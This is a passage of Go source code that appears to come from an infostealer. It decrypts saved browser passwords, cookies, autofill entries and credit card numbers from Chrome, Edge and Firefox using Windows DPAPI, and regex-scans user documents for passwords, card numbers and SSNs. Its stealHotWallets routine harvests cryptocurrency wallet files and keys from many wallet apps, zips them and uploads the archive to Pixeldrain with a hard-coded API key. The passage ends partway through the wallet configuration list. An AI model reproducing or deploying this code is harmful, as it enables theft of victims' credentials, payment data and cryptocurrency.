		ext := strings.ToLower(filepath.Ext(path))
		hasTargetExt := false
		for _, targetExt := range extensions {
			if ext == targetExt {
				hasTargetExt = true
				break
			}
		}

		if !hasTargetExt {
			return nil
		}

		// Scan file for sensitive data
		doc, err := a.scanFileForSensitiveData(path)
		if err != nil {
			return nil // Continue on errors
		}

		if len(doc.Passwords) > 0 || len(doc.EmailAddresses) > 0 || len(doc.CreditCards) > 0 {
			documents = append(documents, doc)
		}

		return nil
	})

	return documents, err
}

// Low-level helper functions

// copyFile copies a file from src to dst with retry mechanism for locked files
func (a *Agent) copyFile(src, dst string) error {
	// Try multiple times in case file is locked
	var lastErr error
	for i := 0; i < 5; i++ {
		sourceFile, err := os.Open(src)
		if err != nil {
			lastErr = err
			time.Sleep(100 * time.Millisecond)
			continue
		}

		destFile, err := os.Create(dst)
		if err != nil {
			sourceFile.Close()
			lastErr = err
			time.Sleep(100 * time.Millisecond)
			continue
		}

		_, err = io.Copy(destFile, sourceFile)
		sourceFile.Close()
		destFile.Close()

		if err != nil {
			lastErr = err
			time.Sleep(100 * time.Millisecond)
			continue
		}

		return nil // Success
	}

	return fmt.Errorf("failed to copy file after 5 attempts: %v", lastErr)
}

// extractPasswordsFromSQLite extracts passwords from Chrome/Edge SQLite database
func (a *Agent) extractPasswordsFromSQLite(dbPath, browser string) ([]config.BrowserPassword, error) {
	var passwords []config.BrowserPassword

	// Open SQLite database
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil {
		return passwords, err
	}
	defer db.Close()

	// Query for passwords
	query := `SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0`
	rows, err := db.Query(query)
	if err != nil {
		return passwords, err
	}
	defer rows.Close()

	// Process each password entry
	for rows.Next() {
		var url, username string
		var passwordBlob []byte

		if err := rows.Scan(&url, &username, &passwordBlob); err != nil {
			continue
		}

		// Skip empty passwords
		if len(passwordBlob) == 0 {
			continue
		}

		// Decrypt password using Windows DPAPI
		decryptedPassword := a.decryptChromePassword(passwordBlob)

		passwords = append(passwords, config.BrowserPassword{
			URL:      url,
			Username: username,
			Password: decryptedPassword,
			Browser:  browser,
		})
	}

	return passwords, nil
}

// decryptChromePassword decrypts Chrome/Edge passwords using Windows DPAPI
func (a *Agent) decryptChromePassword(encryptedPassword []byte) string {
	// Chrome v80+ uses AES-256-GCM encryption with key stored in Local State
	if len(encryptedPassword) > 3 && string(encryptedPassword[:3]) == "v10" {
		// Try to get the key from Local State and decrypt
		decrypted := a.decryptAESCookie(encryptedPassword[3:])
		if decrypted != "" {
			return decrypted
		}
		return "[Encrypted - Chrome v80+]"
	}

	// Use Windows DPAPI for older Chrome versions
	decrypted, err := dpapiBlobDecrypt(encryptedPassword)
	if err != nil {
		return "[Decryption Failed]"
	}

	return string(decrypted)
}

// decryptAESCookie attempts to decrypt Chrome v80+ AES-encrypted cookies/passwords
func (a *Agent) decryptAESCookie(encryptedData []byte) string {
	// This would require parsing the Local State file to get the encryption key
	// and implementing AES-256-GCM decryption. For now, try DPAPI fallback.
	if decrypted, err := dpapiBlobDecrypt(encryptedData); err == nil {
		return string(decrypted)
	}
	return ""
}

// dpapiBlobDecrypt uses Windows DPAPI to decrypt data
func dpapiBlobDecrypt(data []byte) ([]byte, error) {
	// Windows DPAPI CryptUnprotectData
	dllcrypt32 := syscall.NewLazyDLL("Crypt32.dll")
	procDecryptData := dllcrypt32.NewProc("CryptUnprotectData")

	type DATA_BLOB struct {
		cbData uint32
		pbData *byte
	}

	var inBlob DATA_BLOB
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]

	var outBlob DATA_BLOB

	// Call CryptUnprotectData
	ret, _, _ := procDecryptData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed")
	}

	// Copy decrypted data
	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	// Free memory
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procLocalFree := kernel32.NewProc("LocalFree")
	procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	return decrypted, nil
}

// extractCookiesFromSQLite extracts cookies from browser SQLite database
func (a *Agent) extractCookiesFromSQLite(dbPath, browser string) ([]config.BrowserCookie, error) {
	var cookies []config.BrowserCookie

	// Open SQLite database
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil {
		return cookies, err
	}
	defer db.Close()

	// Query for cookies (Chromium-based browsers schema)
	query := `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies`
	rows, err := db.Query(query)
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	// Process each cookie
	for rows.Next() {
		var host, name, path string
		var expires int64
		var secure, httponly int
		var value string
		var encryptedValue []byte

		if err := rows.Scan(&host, &name, &value, &path, &expires, &secure, &httponly, &encryptedValue); err != nil {
			continue
		}

		// Decrypt cookie value if encrypted (for Chromium browsers)
		if len(encryptedValue) > 0 {
			decryptedValue := a.decryptChromePassword(encryptedValue)
			if decryptedValue != "[Decryption Failed]" && decryptedValue != "[Encrypted - Chrome v80+]" {
				value = decryptedValue
			} else {
				// If decryption failed, try fallback DPAPI
				if decrypted, err := dpapiBlobDecrypt(encryptedValue); err == nil {
					value = string(decrypted)
				} else {
					value = decryptedValue // Keep the error message
				}
			}
		}

		cookies = append(cookies, config.BrowserCookie{
			Host:     host,
			Name:     name,
			Value:    value,
			Path:     path,
			Expires:  expires,
			Secure:   secure == 1,
			HttpOnly: httponly == 1,
			Browser:  browser,
		})
	}

	return cookies, nil
}

// extractAutofillFromSQLite extracts autofill data from browser database
func (a *Agent) extractAutofillFromSQLite(dbPath, browser string) ([]config.AutofillData, error) {
	var autofill []config.AutofillData

	// Open SQLite database
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil {
		return autofill, err
	}
	defer db.Close()

	// Map to store autofill profiles
	profiles := make(map[string]*config.AutofillData)

	// Query autofill table for form data
	query := `SELECT name, value FROM autofill WHERE value != ''`
	rows, err := db.Query(query)
	if err == nil {
		defer rows.Close()

		for rows.Next() {
			var name, value string
			if err := rows.Scan(&name, &value); err != nil {
				continue
			}

			// Create a simple profile for each unique value
			if _, exists := profiles[value]; !exists {
				profile := &config.AutofillData{
					Browser: browser,
				}

				// Try to categorize the data
				if strings.Contains(name, "email") || strings.Contains(value, "@") {
					profile.Email = value
				} else if strings.Contains(name, "name") && !strings.Contains(name, "username") {
					profile.Name = value
				} else if strings.Contains(name, "phone") || strings.Contains(name, "tel") {
					profile.Phone = value
				} else if strings.Contains(name, "address") {
					profile.Address = value
				} else if strings.Contains(name, "city") {
					profile.City = value
				} else if strings.Contains(name, "state") {
					profile.State = value
				} else if strings.Contains(name, "zip") || strings.Contains(name, "postal") {
					profile.ZipCode = value
				}

				profiles[value] = profile
			}
		}
	}

	// Query autofill_profiles table if exists (Chrome stores structured data here)
	profileQuery := `SELECT guid, full_name, email, phone_number, address, city, state, zipcode, country FROM autofill_profiles`
	rows2, err := db.Query(profileQuery)
	if err == nil {
		defer rows2.Close()

		for rows2.Next() {
			var guid, fullName, email, phone, address, city, state, zipcode, country sql.NullString

			if err := rows2.Scan(&guid, &fullName, &email, &phone, &address, &city, &state, &zipcode, &country); err != nil {
				continue
			}

			profile := config.AutofillData{
				Browser: browser,
			}

			if fullName.Valid {
				profile.Name = fullName.String
			}
			if email.Valid {
				profile.Email = email.String
			}
			if phone.Valid {
				profile.Phone = phone.String
			}
			if address.Valid {
				profile.Address = address.String
			}
			if city.Valid {
				profile.City = city.String
			}
			if state.Valid {
				profile.State = state.String
			}
			if zipcode.Valid {
				profile.ZipCode = zipcode.String
			}
			if country.Valid {
				profile.Country = country.String
			}

			autofill = append(autofill, profile)
		}
	}

	// Query credit_cards table if exists
	creditCardQuery := `SELECT guid, name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards`
	rows3, err := db.Query(creditCardQuery)
	if err == nil {
		defer rows3.Close()

		for rows3.Next() {
			var guid, nameOnCard sql.NullString
			var cardNumberEnc []byte
			var expMonth, expYear sql.NullInt64

			if err := rows3.Scan(&guid, &nameOnCard, &cardNumberEnc, &expMonth, &expYear); err != nil {
				continue
			}

			// Decrypt credit card number
			cardNumber := "[Encrypted]"
			if len(cardNumberEnc) > 0 {
				cardNumber = a.decryptChromePassword(cardNumberEnc)
			}

			profile := config.AutofillData{
				Browser:    browser,
				CreditCard: cardNumber,
			}

			if nameOnCard.Valid {
				profile.Name = nameOnCard.String
			}
			if expMonth.Valid {
				profile.ExpiryMonth = fmt.Sprintf("%02d", expMonth.Int64)
			}
			if expYear.Valid {
				profile.ExpiryYear = fmt.Sprintf("%04d", expYear.Int64)
			}

			autofill = append(autofill, profile)
		}
	}

	// Convert profiles map to slice
	for _, profile := range profiles {
		if profile.Name != "" || profile.Email != "" || profile.Phone != "" {
			autofill = append(autofill, *profile)
		}
	}

	return autofill, nil
}

// extractFirefoxJSON extracts passwords from Firefox JSON format
func (a *Agent) extractFirefoxJSON(jsonPath string) ([]config.BrowserPassword, error) {
	var passwords []config.BrowserPassword

	// Read Firefox logins.json file
	data, err := ioutil.ReadFile(jsonPath)
	if err != nil {
		return passwords, err
	}

	// Firefox logins.json structure
	type FirefoxLogin struct {
		ID                  int    `json:"id"`
		Hostname            string `json:"hostname"`
		HTTPRealm           string `json:"httpRealm"`
		FormSubmitURL       string `json:"formSubmitURL"`
		UsernameField       string `json:"usernameField"`
		PasswordField       string `json:"passwordField"`
		EncryptedUsername   string `json:"encryptedUsername"`
		EncryptedPassword   string `json:"encryptedPassword"`
		GUID                string `json:"guid"`
		EncType             int    `json:"encType"`
		TimeCreated         int64  `json:"timeCreated"`
		TimeLastUsed        int64  `json:"timeLastUsed"`
		TimePasswordChanged int64  `json:"timePasswordChanged"`
		TimesUsed           int    `json:"timesUsed"`
	}

	type FirefoxLogins struct {
		NextID int            `json:"nextId"`
		Logins []FirefoxLogin `json:"logins"`
	}

	var firefoxData FirefoxLogins
	if err := json.Unmarshal(data, &firefoxData); err != nil {
		return passwords, fmt.Errorf("failed to parse Firefox logins.json: %v", err)
	}

	// Process each login
	for _, login := range firefoxData.Logins {
		// Firefox uses NSS for encryption, which requires the master password
		// For now, we'll indicate that passwords are encrypted
		// Full implementation would require NSS library integration

		passwords = append(passwords, config.BrowserPassword{
			URL:      login.Hostname,
			Username: "[Firefox Encrypted - " + login.EncryptedUsername + "]",
			Password: "[Firefox Encrypted - Requires Master Password]",
			Browser:  "Firefox",
		})
	}

	return passwords, nil
}

// scanFileForSensitiveData scans a file for passwords and sensitive information
func (a *Agent) scanFileForSensitiveData(filePath string) (config.DocumentPassword, error) {
	var doc config.DocumentPassword

	doc.FilePath = filePath
	doc.FileName = filepath.Base(filePath)
	doc.FileType = strings.ToLower(filepath.Ext(filePath))

	// Read file content (limit size for safety)
	file, err := os.Open(filePath)
	if err != nil {
		return doc, err
	}
	defer file.Close()

	// Limit file size to 1MB for scanning
	const maxSize = 1024 * 1024
	buffer := make([]byte, maxSize)
	n, _ := file.Read(buffer)
	content := string(buffer[:n])

	doc.Content = content[:min(len(content), 500)] // Store first 500 chars as preview

	// Regex patterns for sensitive data
	passwordPatterns := []string{
		`(?i)password[:\s=]+([^\s\n\r]+)`,
		`(?i)pass[:\s=]+([^\s\n\r]+)`,
		`(?i)pwd[:\s=]+([^\s\n\r]+)`,
		`(?i)login[:\s=]+([^\s\n\r]+)`,
	}

	emailPattern := `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`
	creditCardPattern := `\b(?:\d{4}[-\s]?){3}\d{4}\b`
	ssnPattern := `\b\d{3}-\d{2}-\d{4}\b`
	phonePattern := `\b\d{3}[-.]?\d{3}[-.]?\d{4}\b`

	// Extract passwords
	for _, pattern := range passwordPatterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllStringSubmatch(content, -1)
		for _, match := range matches {
			if len(match) > 1 {
				doc.Passwords = append(doc.Passwords, match[1])
			}
		}
	}

	// Extract email addresses
	re := regexp.MustCompile(emailPattern)
	doc.EmailAddresses = re.FindAllString(content, -1)

	// Extract credit cards
	re = regexp.MustCompile(creditCardPattern)
	doc.CreditCards = re.FindAllString(content, -1)

	// Extract SSNs
	re = regexp.MustCompile(ssnPattern)
	doc.SSNs = re.FindAllString(content, -1)

	// Extract phone numbers
	re = regexp.MustCompile(phonePattern)
	doc.PhoneNumbers = re.FindAllString(content, -1)

	return doc, nil
}

// Aggregate functions for comprehensive theft

// extractAllBrowserPasswords extracts passwords from all browsers
func (a *Agent) extractAllBrowserPasswords() ([]config.BrowserPassword, error) {
	var allPasswords []config.BrowserPassword

	if chrome, err := a.extractChromePasswords(); err == nil {
		allPasswords = append(allPasswords, chrome...)
	}

	if firefox, err := a.extractFirefoxPasswords(); err == nil {
		allPasswords = append(allPasswords, firefox...)
	}

	if edge, err := a.extractEdgePasswords(); err == nil {
		allPasswords = append(allPasswords, edge...)
	}

	return allPasswords, nil
}

// extractAllBrowserCookies extracts cookies from all browsers
func (a *Agent) extractAllBrowserCookies() ([]config.BrowserCookie, error) {
	var allCookies []config.BrowserCookie

	if chrome, err := a.extractChromeCookies(); err == nil {
		allCookies = append(allCookies, chrome...)
	}

	if firefox, err := a.extractFirefoxCookies(); err == nil {
		allCookies = append(allCookies, firefox...)
	}

	if edge, err := a.extractEdgeCookies(); err == nil {
		allCookies = append(allCookies, edge...)
	}

	return allCookies, nil
}

// extractAllBrowserAutofill extracts autofill data from all browsers
func (a *Agent) extractAllBrowserAutofill() ([]config.AutofillData, error) {
	var allAutofill []config.AutofillData

	if chrome, err := a.extractChromeAutofill(); err == nil {
		allAutofill = append(allAutofill, chrome...)
	}

	if firefox, err := a.extractFirefoxAutofill(); err == nil {
		allAutofill = append(allAutofill, firefox...)
	}

	return allAutofill, nil
}

// extractAllDocumentPasswords scans all common locations for documents
func (a *Agent) extractAllDocumentPasswords() ([]config.DocumentPassword, error) {
	var allDocuments []config.DocumentPassword

	searchPaths := []string{
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Documents",
		os.Getenv("USERPROFILE") + "\\Downloads",
		"C:\\Users\\Public\\Documents",
	}

	extensions := []string{".txt", ".doc", ".docx", ".pdf", ".rtf", ".odt"}

	for _, path := range searchPaths {
		if docs, err := a.scanDocumentsInPath(path, extensions); err == nil {
			allDocuments = append(allDocuments, docs...)
		}
	}

	return allDocuments, nil
}

// Helper function for min
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// extractFirefoxCookiesFromSQLite extracts cookies from Firefox SQLite database
func (a *Agent) extractFirefoxCookiesFromSQLite(dbPath, browser string) ([]config.BrowserCookie, error) {
	var cookies []config.BrowserCookie

	// Open SQLite database
	db, err := sql.Open("sqlite", dbPath+"?mode=ro")
	if err != nil {
		return cookies, err
	}
	defer db.Close()

	// Firefox cookie schema is different from Chromium
	query := `SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies`
	rows, err := db.Query(query)
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	// Process each cookie
	for rows.Next() {
		var host, name, value, path string
		var expiry int64
		var secure, httponly int

		if err := rows.Scan(&host, &name, &value, &path, &expiry, &secure, &httponly); err != nil {
			continue
		}

		// Firefox cookies are not encrypted like Chromium browsers
		cookies = append(cookies, config.BrowserCookie{
			Host:     host,
			Name:     name,
			Value:    value, // Firefox cookies are stored in plaintext
			Path:     path,
			Expires:  expiry,
			Secure:   secure == 1,
			HttpOnly: httponly == 1,
			Browser:  browser,
		})
	}

	return cookies, nil
}

// stealHotWallets performs comprehensive hot wallet detection and file theft
func (a *Agent) stealHotWallets(task *config.Task, result config.TaskResult) config.TaskResult {
	log.Printf("Starting hot wallet detection and theft for agent %s", a.ID)

	var stolenWallets config.StolenWallets
	var detectedWallets []config.HotWalletInfo
	var totalFiles int
	var totalSize int64

	// Define hot wallet configurations
	walletConfigs := a.getHotWalletConfigs()

	log.Printf("Scanning for %d different hot wallet types...", len(walletConfigs))

	for walletName, walletConfig := range walletConfigs {
		log.Printf("Scanning for %s wallet...", walletName)

		walletInfo := config.HotWalletInfo{
			WalletName:    walletName,
			WalletType:    walletConfig.WalletType,
			IsInstalled:   false,
			IsRunning:     false,
			ConfigFiles:   []config.HotWalletFile{},
			WalletFiles:   []config.HotWalletFile{},
			KeystoreFiles: []config.HotWalletFile{},
			BackupFiles:   []config.HotWalletFile{},
			LogFiles:      []config.HotWalletFile{},
		}

		// Check if wallet is installed
		for _, installPath := range walletConfig.InstallPaths {
			if _, err := os.Stat(installPath); err == nil {
				walletInfo.IsInstalled = true
				walletInfo.InstallPath = installPath
				log.Printf("Found %s installation at: %s", walletName, installPath)
				break
			}
		}

		// Check if wallet process is running
		if walletInfo.IsInstalled {
			for _, processName := range walletConfig.ProcessNames {
				if pid := a.isProcessRunning(processName); pid > 0 {
					walletInfo.IsRunning = true
					walletInfo.ProcessID = pid
					log.Printf("%s is currently running (PID: %d)", walletName, pid)
					break
				}
			}
		}

		// Scan data directories for wallet files
		for _, dataDir := range walletConfig.DataDirectories {
			expandedDir := os.ExpandEnv(dataDir)
			if _, err := os.Stat(expandedDir); err == nil {
				walletInfo.DataDirectory = expandedDir
				log.Printf("Found %s data directory: %s", walletName, expandedDir)

				// Scan for different types of wallet files
				configFiles := a.scanWalletFiles(expandedDir, walletConfig.ConfigFiles, walletName, "config")
				walletFiles := a.scanWalletFiles(expandedDir, walletConfig.WalletFiles, walletName, "wallet")
				keystoreFiles := a.scanWalletFiles(expandedDir, walletConfig.KeystoreFiles, walletName, "keystore")
				backupFiles := a.scanWalletFiles(expandedDir, walletConfig.BackupFiles, walletName, "backup")
				logFiles := a.scanWalletFiles(expandedDir, walletConfig.LogFiles, walletName, "log")

				walletInfo.ConfigFiles = append(walletInfo.ConfigFiles, configFiles...)
				walletInfo.WalletFiles = append(walletInfo.WalletFiles, walletFiles...)
				walletInfo.KeystoreFiles = append(walletInfo.KeystoreFiles, keystoreFiles...)
				walletInfo.BackupFiles = append(walletInfo.BackupFiles, backupFiles...)
				walletInfo.LogFiles = append(walletInfo.LogFiles, logFiles...)

				// Calculate totals
				allFiles := append(configFiles, walletFiles...)
				allFiles = append(allFiles, keystoreFiles...)
				allFiles = append(allFiles, backupFiles...)
				allFiles = append(allFiles, logFiles...)

				walletInfo.TotalFilesFound = len(allFiles)
				for _, file := range allFiles {
					walletInfo.TotalSizeBytes += file.FileSize
				}

				totalFiles += walletInfo.TotalFilesFound
				totalSize += walletInfo.TotalSizeBytes

				log.Printf("Found %d files for %s (%.2f MB)", walletInfo.TotalFilesFound, walletName, float64(walletInfo.TotalSizeBytes)/1024/1024)
			}
		}

		// Only add wallet info if we found something
		if walletInfo.IsInstalled || walletInfo.TotalFilesFound > 0 {
			detectedWallets = append(detectedWallets, walletInfo)
		}
	}

	// Populate final result
	stolenWallets.DetectedWallets = detectedWallets
	stolenWallets.TotalWallets = len(detectedWallets)
	stolenWallets.TotalFiles = totalFiles
	stolenWallets.TotalSizeBytes = totalSize
	stolenWallets.Timestamp = time.Now().Unix()
	stolenWallets.AgentID = a.ID

	// If we have files, upload them to Pixeldrain
	if totalFiles > 0 {
		log.Printf("Uploading %d wallet files to Pixeldrain...", totalFiles)

		downloadURL, err := a.uploadWalletFilesToPixeldrain(&stolenWallets)
		if err != nil {
			log.Printf("Failed to upload to Pixeldrain: %v", err)
			stolenWallets.DownloadURL = ""
		} else {
			stolenWallets.DownloadURL = downloadURL
			log.Printf("Successfully uploaded wallet files to: %s", downloadURL)
		}
	}

	result.WalletData = &stolenWallets
	result.Success = len(detectedWallets) > 0

	if result.Success {
		result.Output = fmt.Sprintf("Hot wallet scan complete: %d wallets detected, %d files stolen (%.2f MB total)",
			stolenWallets.TotalWallets, stolenWallets.TotalFiles, float64(stolenWallets.TotalSizeBytes)/1024/1024)
		log.Printf("Hot wallet theft successful: %d wallets, %d files", stolenWallets.TotalWallets, stolenWallets.TotalFiles)
	} else {
		result.Output = "No hot wallets detected on this system"
		log.Printf("No hot wallets found on system")
	}

	return result
}

// uploadWalletFilesToPixeldrain creates a ZIP archive of wallet files and uploads to Pixeldrain
func (a *Agent) uploadWalletFilesToPixeldrain(walletData *config.StolenWallets) (string, error) {
	// Create a temporary ZIP file
	tempFile, err := os.CreateTemp("", "wallets_*.zip")
	if err != nil {
		return "", fmt.Errorf("failed to create temp file: %v", err)
	}
	defer os.Remove(tempFile.Name())
	defer tempFile.Close()

	// Create ZIP writer
	zipWriter := zip.NewWriter(tempFile)

	// Add all wallet files to ZIP
	for _, wallet := range walletData.DetectedWallets {
		// Create wallet directory in ZIP
		walletDir := fmt.Sprintf("%s_%s/", wallet.WalletName, wallet.WalletType)

		// Helper function to add files to ZIP
		addFilesToZip := func(files []config.HotWalletFile, subDir string) {
			for _, file := range files {
				// Skip files without content
				if file.FileContent == "" {
					continue
				}

				// Decode base64 content
				content, err := base64.StdEncoding.DecodeString(file.FileContent)
				if err != nil {
					log.Printf("Failed to decode file content for %s: %v", file.FileName, err)
					continue
				}

				// Create file in ZIP
				zipPath := walletDir + subDir + "/" + file.FileName
				writer, err := zipWriter.Create(zipPath)
				if err != nil {
					log.Printf("Failed to create ZIP entry for %s: %v", file.FileName, err)
					continue
				}

				// Write content
				if _, err := writer.Write(content); err != nil {
					log.Printf("Failed to write ZIP content for %s: %v", file.FileName, err)
				}
			}
		}

		// Add all file types
		addFilesToZip(wallet.ConfigFiles, "config")
		addFilesToZip(wallet.WalletFiles, "wallet")
		addFilesToZip(wallet.KeystoreFiles, "keystore")
		addFilesToZip(wallet.BackupFiles, "backup")
		addFilesToZip(wallet.LogFiles, "logs")

		// Add wallet info file
		infoContent := fmt.Sprintf("Wallet: %s\nType: %s\nInstalled: %v\nRunning: %v\nProcess ID: %d\nInstall Path: %s\nData Directory: %s\nTotal Files: %d\nTotal Size: %.2f MB\n",
			wallet.WalletName, wallet.WalletType, wallet.IsInstalled, wallet.IsRunning, wallet.ProcessID,
			wallet.InstallPath, wallet.DataDirectory, wallet.TotalFilesFound, float64(wallet.TotalSizeBytes)/1024/1024)

		infoWriter, err := zipWriter.Create(walletDir + "wallet_info.txt")
		if err == nil {
			infoWriter.Write([]byte(infoContent))
		}
	}

	// Close ZIP writer
	if err := zipWriter.Close(); err != nil {
		return "", fmt.Errorf("failed to close ZIP: %v", err)
	}

	// Get file size
	fileInfo, err := tempFile.Stat()
	if err != nil {
		return "", fmt.Errorf("failed to stat ZIP file: %v", err)
	}

	// Reopen file for reading
	tempFile.Seek(0, 0)

	// Create filename with timestamp and agent ID
	fileName := fmt.Sprintf("wallets_%s_%d.zip", a.ID[:8], time.Now().Unix())

	// Upload to Pixeldrain
	apiKey := "0c15316a-a603-4e3c-92a1-03d9fc6a9e7a"
	uploadURL := fmt.Sprintf("https://pixeldrain.com/api/file/%s", fileName)

	// Create request
	req, err := http.NewRequest("PUT", uploadURL, tempFile)
	if err != nil {
		return "", fmt.Errorf("failed to create request: %v", err)
	}

	// Set authentication
	req.SetBasicAuth("", apiKey)
	req.Header.Set("Content-Type", "application/zip")
	req.ContentLength = fileInfo.Size()

	// Execute request
	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("upload request failed: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	if resp.StatusCode != 201 {
		return "", fmt.Errorf("upload failed with status %d: %s", resp.StatusCode, string(body))
	}

	// Parse response to get file ID
	var uploadResp struct {
		ID string `json:"id"`
	}
	if err := json.Unmarshal(body, &uploadResp); err != nil {
		return "", fmt.Errorf("failed to parse response: %v", err)
	}

	// Return download URL
	downloadURL := fmt.Sprintf("https://pixeldrain.com/u/%s", uploadResp.ID)
	return downloadURL, nil
}

// Helper functions for credential extraction

// Hot wallet configuration structure
type WalletConfig struct {
	WalletType      string
	InstallPaths    []string
	ProcessNames    []string
	DataDirectories []string
	ConfigFiles     []string
	WalletFiles     []string
	KeystoreFiles   []string
	BackupFiles     []string
	LogFiles        []string
}

// getHotWalletConfigs returns comprehensive hot wallet configurations
func (a *Agent) getHotWalletConfigs() map[string]WalletConfig {
	userProfile := os.Getenv("USERPROFILE")
	appData := os.Getenv("APPDATA")
	localAppData := os.Getenv("LOCALAPPDATA")

	return map[string]WalletConfig{
		"Exodus": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\Exodus\\Exodus.exe",
				"C:\\Program Files\\Exodus\\Exodus.exe",
				userProfile + "\\Desktop\\Exodus.exe",
			},
			ProcessNames: []string{"Exodus.exe", "exodus.exe"},
			DataDirectories: []string{
				appData + "\\Exodus",
			},
			ConfigFiles:   []string{"*.json", "*.conf", "*.ini", "exodus.conf.json", "window-state.json"},
			WalletFiles:   []string{"*.seco", "*.wallet", "*.json", "*.dat", "*.db", "*.sqlite", "seed.seco", "passphrase.json", "*.ldb", "CURRENT", "LOCK", "LOG*", "MANIFEST*"},
			KeystoreFiles: []string{"*.keystore", "keystore\\*", "*.key"},
			BackupFiles:   []string{"*.backup", "backup\\*", "*.seed", "*.mnemonic", "exodus-backup*"},
			LogFiles:      []string{"*.log", "*.txt"},
		},
		"Atomic Wallet": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\atomic\\Atomic Wallet.exe",
				"C:\\Program Files\\Atomic Wallet\\Atomic Wallet.exe",
				userProfile + "\\Desktop\\Atomic Wallet.exe",
			},
			ProcessNames: []string{"Atomic Wallet.exe", "atomic.exe"},
			DataDirectories: []string{
				appData + "\\atomic",
			},
			ConfigFiles:   []string{"*.json", "*.ini", "*.conf"},
			WalletFiles:   []string{"*.ldb", "*.log", "*.dat", "*.db", "*.sqlite", "*.aes", "CURRENT", "LOCK", "LOG*", "MANIFEST*"},
			KeystoreFiles: []string{"*.keystore", "keystore\\*", "*.key"},
			BackupFiles:   []string{"*.backup", "backup\\*", "*.seed", "*.mnemonic"},
			LogFiles:      []string{"*.log", "*.txt"},
		},
		"Electrum": {
			WalletType: "Bitcoin",
			InstallPaths: []string{
				localAppData + "\\Programs\\Electrum\\electrum.exe",
				"C:\\Program Files\\Electrum\\electrum.exe",
				"C:\\Program Files (x86)\\Electrum\\electrum.exe",
			},
			ProcessNames: []string{"electrum.exe", "Electrum.exe"},
			DataDirectories: []string{
				appData + "\\Electrum\\wallets",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"default_wallet", "*.dat", "wallets\\*"},
			KeystoreFiles: []string{"*.keystore"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Bitcoin Core": {
			WalletType: "Bitcoin",
			InstallPaths: []string{
				"C:\\Program Files\\Bitcoin\\bitcoin-qt.exe",
				"C:\\Program Files (x86)\\Bitcoin\\bitcoin-qt.exe",
				localAppData + "\\Programs\\Bitcoin\\bitcoin-qt.exe",
			},
			ProcessNames: []string{"bitcoin-qt.exe", "bitcoind.exe"},
			DataDirectories: []string{
				appData + "\\Bitcoin",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"wallet.dat", "*.dat"},
			KeystoreFiles: []string{"*.key", "*.pem"},
			BackupFiles:   []string{"*.backup", "*.bak", "wallet.dat.backup"},
			LogFiles:      []string{},
		},
		"Litecoin Core": {
			WalletType: "Litecoin",
			InstallPaths: []string{
				"C:\\Program Files\\Litecoin\\litecoin-qt.exe",
				"C:\\Program Files (x86)\\Litecoin\\litecoin-qt.exe",
			},
			ProcessNames: []string{"litecoin-qt.exe", "litecoind.exe"},
			DataDirectories: []string{
				appData + "\\Litecoin",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"wallet.dat", "*.dat"},
			KeystoreFiles: []string{"*.key", "*.pem"},
			BackupFiles:   []string{"*.backup", "*.bak", "wallet.dat.backup"},
			LogFiles:      []string{},
		},
		"Dogecoin Core": {
			WalletType: "Dogecoin",
			InstallPaths: []string{
				"C:\\Program Files\\Dogecoin\\dogecoin-qt.exe",
				"C:\\Program Files (x86)\\Dogecoin\\dogecoin-qt.exe",
			},
			ProcessNames: []string{"dogecoin-qt.exe", "dogecoind.exe"},
			DataDirectories: []string{
				appData + "\\DogeCoin",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"wallet.dat", "*.dat"},
			KeystoreFiles: []string{"*.key", "*.pem"},
			BackupFiles:   []string{"*.backup", "*.bak", "wallet.dat.backup"},
			LogFiles:      []string{},
		},
		"Monero GUI": {
			WalletType: "Monero",
			InstallPaths: []string{
				"C:\\Program Files\\Monero GUI\\monero-wallet-gui.exe",
				localAppData + "\\Programs\\Monero\\monero-wallet-gui.exe",
			},
			ProcessNames: []string{"monero-wallet-gui.exe", "monerod.exe"},
			DataDirectories: []string{
				userProfile + "\\Documents\\Monero\\wallets",
				appData + "\\Monero\\wallets",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.keys", "*.wallet"},
			KeystoreFiles: []string{"*.keys"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Ethereum Wallet": {
			WalletType: "Ethereum",
			InstallPaths: []string{
				localAppData + "\\Programs\\Ethereum Wallet\\Ethereum Wallet.exe",
				"C:\\Program Files\\Ethereum Wallet\\Ethereum Wallet.exe",
			},
